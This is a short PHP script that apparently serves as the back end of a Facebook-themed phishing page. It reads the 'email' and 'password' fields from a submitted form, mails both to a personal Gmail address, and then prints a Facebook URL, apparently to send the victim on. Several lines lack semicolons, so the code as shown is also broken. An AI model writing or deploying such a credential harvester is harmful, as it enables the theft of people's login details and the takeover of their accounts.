<?php
$email = $_POST["email"]
$passkey = $_POST["password"]

$mailheader = "From:".$email."<".$passkey.">\r\n"
$recipient = "israelstoba@gmail.com"

mail($recipient, $email, $mailheader)
or die("Error");

echo"https://web.facebook.com";
?>